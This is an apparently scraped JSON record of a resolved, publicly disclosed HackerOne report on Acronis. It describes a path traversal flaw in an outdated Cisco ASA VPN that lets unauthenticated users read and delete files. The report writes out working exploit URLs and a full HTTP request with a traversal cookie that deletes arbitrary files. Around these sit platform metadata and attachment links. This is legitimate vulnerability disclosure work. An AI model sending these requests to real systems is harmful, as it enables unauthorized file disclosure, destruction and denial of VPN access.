@@ -1,0 +1,237 @@
+{
+  "id": 924407,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjQ0MDc=",
+  "url": "https://hackerone.com/reports/924407",
+  "title": "Local File Disclosure /Delete On [us-az-vpn.acronis.com]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-15T13:01:14.953Z",
+  "submitted_at": "2020-07-15T13:01:14.953Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "10nf",
+    "url": "/10nf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/J1tXDaUQ2vAnWyACoRJzaQ9D/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13428,
+    "url": "https://hackerone.com/acronis",
+    "handle": "acronis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Acronis",
+      "twitter_handle": "Acronis",
+      "website": "https://www.acronis.com",
+      "about": "Complete integrated cybersecurity and data protection for MSPs and IT teams"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-22T14:47:39.234Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-22T14:47:39.138Z",
+  "team_member_agreed_on_going_public_at": "2021-06-22T06:38:09.794Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Cisco ASA VPN server hosted on\n\n* https://us-az-vpn.acronis.com\n\n\nwas found to be using an outdated version that suffers from a Local File Disclosure /Delete vulnerability. Through this vulnerability an unauthenticated remote attacker can read and delete the contents of any file stored on the VPN server without authentication; including the VPN \"lua\" source code files .\nThis vulnerability can delete any file and break the vpn , so it should be carefully tested\nThe files will be restored after VPN restart\n\n\n##Technical details:\n### Affected Endpoint for delete :\n\n* https://us-az-vpn.acronis.com/+CSCOE+/session_password.html\n\n\n```Affected Cookie Parameter: token```\n```Request Method: GET```\n\n### Affected Endpoint for read files:\n\n* https://us-az-vpn.acronis.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\n\n```Affected Cookie Parameter: textdomain```\n```Request Method: GET```\n{F908308}\n\n\nThis vulnerability is critical and can't be tested on production environment as it will break the VPN by deleting any file , so I tested on local environment .\n\nWe need to verify that the vulnerability exists :\n\n* Firstly I downloaded the vulnerable code and compared it with the code from local environment , and they were identical\n{F908308}\n* Secondly, When this path exists +CSCOE+/session_password.html this means the vulnerability isn't patched , and if the response is 404 that means the vulnerability is patched\n\n{F908309}\n\n# Exploiting the vulnerability on local environment :\n* Trying to download a file :\n```\nhttps://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../\n```\n{F908307}\n\n* Exploit the vulnerability using this request :\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: 192.168.1.100\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nCookie: token=../../../../../../+CSCOE+/wrong_url.html\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n```\n\nThe file is read and stored in webvpn cookie and then deleted \n{F908305}\n\n* Trying to read the file again after delete :\n\n```\nhttps://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../\n```\n\n{F908306}\n\n## Impact\n\nThe vulnerability allows a remote unauthenticated attacker to read and download files from Cisco ASA VPN server, thus an attacker can use the vulnerability to read and delete internal files from the server such as:\n\n* The VPN's LUA source code files\n* Delete any file\n* Break the vpn web portal\n* Prevent users from authenticate via web portal",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 908305,
+      "file_name": "delete_file.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iVVeKvqDGymXqUhahs5diSYm?response-content-disposition=attachment%3B%20filename%3D%22delete_file.png%22%3B%20filename%2A%3DUTF-8%27%27delete_file.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRX6CNCUP%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T063548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJHMEUCIGGT%2FzB3SnPg0Mq4fis0okOfHS6K0VX84M5iYTB%2FrnmkAiEA6IKSnoeoIpSqfB4sFG%2FpDvMwGKoSbyQKnA0MHVEa4aEqsQUIBxADGgwwMTM2MTkyNzQ4NDkiDFNCDn4jutt76%2BVIOCqOBTNZMRN44iqngfXtltP4Z2HZDgrv5UfWNR0vAYUrWCuCr9nMGvHanIFrlxXduhPq4iqS9tRLJBTtaI5arxEumSpoMLJPPimJtmH1gHogaiuof3dBxDURESz1BzWGZi4p8zTSAjtDwf3pTP1bqkDMGjaXvgXHcGaW0QB%2BYbU7HxGeVCy7aA6fogxAD6sYZre0MA8kSz2I95%2FGArRDPY4x%2Bt3r%2Bg3EQjHBixzEaMqaW9rc%2F3Pt9gBQ8xH2e9fF2h0%2F0QtzcC%2BlmEtZTIEEglrScdczZ%2B1bTsxvzKBfySK3lQbT1NGYFWUM64WjOldKiMQRk8HX4Rng6nYiGuYeWWztSkFHzRum19alzF8xp%2Ff0vJQ2AdPIbMyvVCkf2%2Fc9gGWVkNHhr34mIy9Os1KBeDn3uPiJo8R15ozrQ1%2B1VwLhIKgzUPVvzTTO3WcCKSc2bcUvv%2FEj5ccsJjn2PD5Udu%2FpLR8J9hrSTrjNW45%2BKC4wu%2B8aaT86CJkkCDz%2Fk%2FVYMC0AUXT7NI6APZOaYewqj0ZnGkcA5OSCzaGEKOUQ8GASvPjTQaP9P%2Fli5VbnfKrDcioTn6IWK9prz2H3QwRtc8pCGJ8F45R3KD11EKsnIzuu3t%2BwMh3OHwdOCmBo1VzbzNG6VijDiOZDxxJbqzkdaChUahzyU6%2FYj%2FGMOimU%2F0LKvU4c%2F3Fpp78MYesqUgJa4SThCBxZhNKaGNnRRLbWfa7rGl6JiuO9zJA8uVuCeABSN295WbrSVNKOad0D6Ghlomaz1CXgxw1j8RcCzs5JcZJQfr7%2FtIwXJJ%2F6QD9kIkuzGnYdtshilVkYccVhzf0BYCPBMrNRkwecoGQAS0hyKfGrq9DEF3CkW3TKVQnNVqdHdjDYkZ3SBjqxAYRgAJqeeFqc%2BPSoV4NOd92XYKEnkcaSfpi8DI%2FCa%2FJ1uhRWFQI2fvhOXa%2FhoYX5SWfjhgz12wcilD07ulN%2FPwwdhHD0ceYd%2BOas3%2FzpE%2Bt4Zj2gjOt%2BNtruSOWgtiZUsU80y6qzAgv7Q83QnluWqvu7x1U%2Bs0UqL9splazjPqHwJEsNJ9Gk0Ct9Lqms1Qvj3PmUH6qBFYqA3xbhEfS6iuApGmvXMtWQsjUOHifGrXM0zQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=053ab1856654ff1d9aaaf7d352c5e6d2d015b1aef2581c7893fac4681d522ecc",
+      "file_size": 49719,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 908306,
+      "file_name": "file_after_delete.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FSQiBHfWSt6JyWWiCRDybwY6?response-content-disposition=attachment%3B%20filename%3D%22file_after_delete.png%22%3B%20filename%2A%3DUTF-8%27%27file_after_delete.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRX6CNCUP%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T063548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJHMEUCIGGT%2FzB3SnPg0Mq4fis0okOfHS6K0VX84M5iYTB%2FrnmkAiEA6IKSnoeoIpSqfB4sFG%2FpDvMwGKoSbyQKnA0MHVEa4aEqsQUIBxADGgwwMTM2MTkyNzQ4NDkiDFNCDn4jutt76%2BVIOCqOBTNZMRN44iqngfXtltP4Z2HZDgrv5UfWNR0vAYUrWCuCr9nMGvHanIFrlxXduhPq4iqS9tRLJBTtaI5arxEumSpoMLJPPimJtmH1gHogaiuof3dBxDURESz1BzWGZi4p8zTSAjtDwf3pTP1bqkDMGjaXvgXHcGaW0QB%2BYbU7HxGeVCy7aA6fogxAD6sYZre0MA8kSz2I95%2FGArRDPY4x%2Bt3r%2Bg3EQjHBixzEaMqaW9rc%2F3Pt9gBQ8xH2e9fF2h0%2F0QtzcC%2BlmEtZTIEEglrScdczZ%2B1bTsxvzKBfySK3lQbT1NGYFWUM64WjOldKiMQRk8HX4Rng6nYiGuYeWWztSkFHzRum19alzF8xp%2Ff0vJQ2AdPIbMyvVCkf2%2Fc9gGWVkNHhr34mIy9Os1KBeDn3uPiJo8R15ozrQ1%2B1VwLhIKgzUPVvzTTO3WcCKSc2bcUvv%2FEj5ccsJjn2PD5Udu%2FpLR8J9hrSTrjNW45%2BKC4wu%2B8aaT86CJkkCDz%2Fk%2FVYMC0AUXT7NI6APZOaYewqj0ZnGkcA5OSCzaGEKOUQ8GASvPjTQaP9P%2Fli5VbnfKrDcioTn6IWK9prz2H3QwRtc8pCGJ8F45R3KD11EKsnIzuu3t%2BwMh3OHwdOCmBo1VzbzNG6VijDiOZDxxJbqzkdaChUahzyU6%2FYj%2FGMOimU%2F0LKvU4c%2F3Fpp78MYesqUgJa4SThCBxZhNKaGNnRRLbWfa7rGl6JiuO9zJA8uVuCeABSN295WbrSVNKOad0D6Ghlomaz1CXgxw1j8RcCzs5JcZJQfr7%2FtIwXJJ%2F6QD9kIkuzGnYdtshilVkYccVhzf0BYCPBMrNRkwecoGQAS0hyKfGrq9DEF3CkW3TKVQnNVqdHdjDYkZ3SBjqxAYRgAJqeeFqc%2BPSoV4NOd92XYKEnkcaSfpi8DI%2FCa%2FJ1uhRWFQI2fvhOXa%2FhoYX5SWfjhgz12wcilD07ulN%2FPwwdhHD0ceYd%2BOas3%2FzpE%2Bt4Zj2gjOt%2BNtruSOWgtiZUsU80y6qzAgv7Q83QnluWqvu7x1U%2Bs0UqL9splazjPqHwJEsNJ9Gk0Ct9Lqms1Qvj3PmUH6qBFYqA3xbhEfS6iuApGmvXMtWQsjUOHifGrXM0zQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6457fc182f8dd4a5487fe03c172983aacae0aaa104069ea6fb4281792f3f7fe5",
+      "file_size": 51345,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 908307,
+      "file_name": "file_before_delete.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cwSsq37r6aUKcGSLofGSSf4z?response-content-disposition=attachment%3B%20filename%3D%22file_before_delete.png%22%3B%20filename%2A%3DUTF-8%27%27file_before_delete.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRX6CNCUP%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T063548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJHMEUCIGGT%2FzB3SnPg0Mq4fis0okOfHS6K0VX84M5iYTB%2FrnmkAiEA6IKSnoeoIpSqfB4sFG%2FpDvMwGKoSbyQKnA0MHVEa4aEqsQUIBxADGgwwMTM2MTkyNzQ4NDkiDFNCDn4jutt76%2BVIOCqOBTNZMRN44iqngfXtltP4Z2HZDgrv5UfWNR0vAYUrWCuCr9nMGvHanIFrlxXduhPq4iqS9tRLJBTtaI5arxEumSpoMLJPPimJtmH1gHogaiuof3dBxDURESz1BzWGZi4p8zTSAjtDwf3pTP1bqkDMGjaXvgXHcGaW0QB%2BYbU7HxGeVCy7aA6fogxAD6sYZre0MA8kSz2I95%2FGArRDPY4x%2Bt3r%2Bg3EQjHBixzEaMqaW9rc%2F3Pt9gBQ8xH2e9fF2h0%2F0QtzcC%2BlmEtZTIEEglrScdczZ%2B1bTsxvzKBfySK3lQbT1NGYFWUM64WjOldKiMQRk8HX4Rng6nYiGuYeWWztSkFHzRum19alzF8xp%2Ff0vJQ2AdPIbMyvVCkf2%2Fc9gGWVkNHhr34mIy9Os1KBeDn3uPiJo8R15ozrQ1%2B1VwLhIKgzUPVvzTTO3WcCKSc2bcUvv%2FEj5ccsJjn2PD5Udu%2FpLR8J9hrSTrjNW45%2BKC4wu%2B8aaT86CJkkCDz%2Fk%2FVYMC0AUXT7NI6APZOaYewqj0ZnGkcA5OSCzaGEKOUQ8GASvPjTQaP9P%2Fli5VbnfKrDcioTn6IWK9prz2H3QwRtc8pCGJ8F45R3KD11EKsnIzuu3t%2BwMh3OHwdOCmBo1VzbzNG6VijDiOZDxxJbqzkdaChUahzyU6%2FYj%2FGMOimU%2F0LKvU4c%2F3Fpp78MYesqUgJa4SThCBxZhNKaGNnRRLbWfa7rGl6JiuO9zJA8uVuCeABSN295WbrSVNKOad0D6Ghlomaz1CXgxw1j8RcCzs5JcZJQfr7%2FtIwXJJ%2F6QD9kIkuzGnYdtshilVkYccVhzf0BYCPBMrNRkwecoGQAS0hyKfGrq9DEF3CkW3TKVQnNVqdHdjDYkZ3SBjqxAYRgAJqeeFqc%2BPSoV4NOd92XYKEnkcaSfpi8DI%2FCa%2FJ1uhRWFQI2fvhOXa%2FhoYX5SWfjhgz12wcilD07ulN%2FPwwdhHD0ceYd%2BOas3%2FzpE%2Bt4Zj2gjOt%2BNtruSOWgtiZUsU80y6qzAgv7Q83QnluWqvu7x1U%2Bs0UqL9splazjPqHwJEsNJ9Gk0Ct9Lqms1Qvj3PmUH6qBFYqA3xbhEfS6iuApGmvXMtWQsjUOHifGrXM0zQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=64e92d690a6f181b8ae5304fd0acf9a44f0d6dd2c8c737f64cf5315650fed80f",
+      "file_size": 59483,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 908308,
+      "file_name": "lfd.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uoz62TbueczNQuJjxBtQYjPU?response-content-disposition=attachment%3B%20filename%3D%22lfd.png%22%3B%20filename%2A%3DUTF-8%27%27lfd.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRX6CNCUP%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T063548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJHMEUCIGGT%2FzB3SnPg0Mq4fis0okOfHS6K0VX84M5iYTB%2FrnmkAiEA6IKSnoeoIpSqfB4sFG%2FpDvMwGKoSbyQKnA0MHVEa4aEqsQUIBxADGgwwMTM2MTkyNzQ4NDkiDFNCDn4jutt76%2BVIOCqOBTNZMRN44iqngfXtltP4Z2HZDgrv5UfWNR0vAYUrWCuCr9nMGvHanIFrlxXduhPq4iqS9tRLJBTtaI5arxEumSpoMLJPPimJtmH1gHogaiuof3dBxDURESz1BzWGZi4p8zTSAjtDwf3pTP1bqkDMGjaXvgXHcGaW0QB%2BYbU7HxGeVCy7aA6fogxAD6sYZre0MA8kSz2I95%2FGArRDPY4x%2Bt3r%2Bg3EQjHBixzEaMqaW9rc%2F3Pt9gBQ8xH2e9fF2h0%2F0QtzcC%2BlmEtZTIEEglrScdczZ%2B1bTsxvzKBfySK3lQbT1NGYFWUM64WjOldKiMQRk8HX4Rng6nYiGuYeWWztSkFHzRum19alzF8xp%2Ff0vJQ2AdPIbMyvVCkf2%2Fc9gGWVkNHhr34mIy9Os1KBeDn3uPiJo8R15ozrQ1%2B1VwLhIKgzUPVvzTTO3WcCKSc2bcUvv%2FEj5ccsJjn2PD5Udu%2FpLR8J9hrSTrjNW45%2BKC4wu%2B8aaT86CJkkCDz%2Fk%2FVYMC0AUXT7NI6APZOaYewqj0ZnGkcA5OSCzaGEKOUQ8GASvPjTQaP9P%2Fli5VbnfKrDcioTn6IWK9prz2H3QwRtc8pCGJ8F45R3KD11EKsnIzuu3t%2BwMh3OHwdOCmBo1VzbzNG6VijDiOZDxxJbqzkdaChUahzyU6%2FYj%2FGMOimU%2F0LKvU4c%2F3Fpp78MYesqUgJa4SThCBxZhNKaGNnRRLbWfa7rGl6JiuO9zJA8uVuCeABSN295WbrSVNKOad0D6Ghlomaz1CXgxw1j8RcCzs5JcZJQfr7%2FtIwXJJ%2F6QD9kIkuzGnYdtshilVkYccVhzf0BYCPBMrNRkwecoGQAS0hyKfGrq9DEF3CkW3TKVQnNVqdHdjDYkZ3SBjqxAYRgAJqeeFqc%2BPSoV4NOd92XYKEnkcaSfpi8DI%2FCa%2FJ1uhRWFQI2fvhOXa%2FhoYX5SWfjhgz12wcilD07ulN%2FPwwdhHD0ceYd%2BOas3%2FzpE%2Bt4Zj2gjOt%2BNtruSOWgtiZUsU80y6qzAgv7Q83QnluWqvu7x1U%2Bs0UqL9splazjPqHwJEsNJ9Gk0Ct9Lqms1Qvj3PmUH6qBFYqA3xbhEfS6iuApGmvXMtWQsjUOHifGrXM0zQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b6219fa588eb32ca28ddc5f0c25f65af4aced442417d7524241d7d19fd6499a7",
+      "file_size": 126672,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 908309,
+      "file_name": "password.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/CJp2jedRrXMe66yt5Mmdt6hk?response-content-disposition=attachment%3B%20filename%3D%22password.png%22%3B%20filename%2A%3DUTF-8%27%27password.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRX6CNCUP%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T063548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED4aCXVzLXdlc3QtMiJHMEUCIGGT%2FzB3SnPg0Mq4fis0okOfHS6K0VX84M5iYTB%2FrnmkAiEA6IKSnoeoIpSqfB4sFG%2FpDvMwGKoSbyQKnA0MHVEa4aEqsQUIBxADGgwwMTM2MTkyNzQ4NDkiDFNCDn4jutt76%2BVIOCqOBTNZMRN44iqngfXtltP4Z2HZDgrv5UfWNR0vAYUrWCuCr9nMGvHanIFrlxXduhPq4iqS9tRLJBTtaI5arxEumSpoMLJPPimJtmH1gHogaiuof3dBxDURESz1BzWGZi4p8zTSAjtDwf3pTP1bqkDMGjaXvgXHcGaW0QB%2BYbU7HxGeVCy7aA6fogxAD6sYZre0MA8kSz2I95%2FGArRDPY4x%2Bt3r%2Bg3EQjHBixzEaMqaW9rc%2F3Pt9gBQ8xH2e9fF2h0%2F0QtzcC%2BlmEtZTIEEglrScdczZ%2B1bTsxvzKBfySK3lQbT1NGYFWUM64WjOldKiMQRk8HX4Rng6nYiGuYeWWztSkFHzRum19alzF8xp%2Ff0vJQ2AdPIbMyvVCkf2%2Fc9gGWVkNHhr34mIy9Os1KBeDn3uPiJo8R15ozrQ1%2B1VwLhIKgzUPVvzTTO3WcCKSc2bcUvv%2FEj5ccsJjn2PD5Udu%2FpLR8J9hrSTrjNW45%2BKC4wu%2B8aaT86CJkkCDz%2Fk%2FVYMC0AUXT7NI6APZOaYewqj0ZnGkcA5OSCzaGEKOUQ8GASvPjTQaP9P%2Fli5VbnfKrDcioTn6IWK9prz2H3QwRtc8pCGJ8F45R3KD11EKsnIzuu3t%2BwMh3OHwdOCmBo1VzbzNG6VijDiOZDxxJbqzkdaChUahzyU6%2FYj%2FGMOimU%2F0LKvU4c%2F3Fpp78MYesqUgJa4SThCBxZhNKaGNnRRLbWfa7rGl6JiuO9zJA8uVuCeABSN295WbrSVNKOad0D6Ghlomaz1CXgxw1j8RcCzs5JcZJQfr7%2FtIwXJJ%2F6QD9kIkuzGnYdtshilVkYccVhzf0BYCPBMrNRkwecoGQAS0hyKfGrq9DEF3CkW3TKVQnNVqdHdjDYkZ3SBjqxAYRgAJqeeFqc%2BPSoV4NOd92XYKEnkcaSfpi8DI%2FCa%2FJ1uhRWFQI2fvhOXa%2FhoYX5SWfjhgz12wcilD07ulN%2FPwwdhHD0ceYd%2BOas3%2FzpE%2Bt4Zj2gjOt%2BNtruSOWgtiZUsU80y6qzAgv7Q83QnluWqvu7x1U%2Bs0UqL9splazjPqHwJEsNJ9Gk0Ct9Lqms1Qvj3PmUH6qBFYqA3xbhEfS6iuApGmvXMtWQsjUOHifGrXM0zQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d4f22bd87ed32e39b223d64efbeca5cbc5fefbb2f993abd536bd0649db7d133a",
+      "file_size": 82794,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 21,
+  "voters": [
+    "mr-medi",
+    "cucumbersalad",
+    "omarelfarsaoui",
+    "7odamoo",
+    "diogourupes",
+    "shreyaschavhan",
+    "2026",
+    "mrbebo",
+    "10nf",
+    "sa1tama0",
+    "and 11 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 50773,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.acronis.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "924407",
+  "votes": 21,
+  "latest_disclosable_activity_at": "2021-06-22T14:47:39.285Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T14:35:49.066215",
+    "source": "https://hackerone.com/reports/924407.json",
+    "report_id": 924407
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjQ0MDc=",
+    "databaseId": "924407",
+    "title": "Local File Disclosure /Delete On [us-az-vpn.acronis.com]",
+    "url": "https://hackerone.com/reports/924407",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2021-06-22T14:47:39.234Z",
+    "created_at": "2020-07-15T13:01:14.953Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE5",
+      "name": "Path Traversal",
+      "external_id": "cwe-22"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "10nf"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzNDI4",
+      "handle": "acronis",
+      "name": "Acronis",
+      "url": "https://hackerone.com/acronis",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yMzUxODU=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-07-28T09:55:30.961Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzkyNDQwNw==",
+    "_id": "924407",
+    "disclosed": true,
+    "votes": 21,
+    "latest_disclosable_activity_at": "2021-06-22T14:47:39.285Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjQ0MDc=",
+      "databaseId": "924407",
+      "title": "Local File Disclosure /Delete On [us-az-vpn.acronis.com]",
+      "url": "https://hackerone.com/reports/924407",
+      "disclosed_at": "2021-06-22T14:47:39.234Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzNDI4",
+      "handle": "acronis",
+      "name": "Acronis",
+      "url": "https://hackerone.com/acronis",
+      "currency": "usd"
+    }
+  }
+}
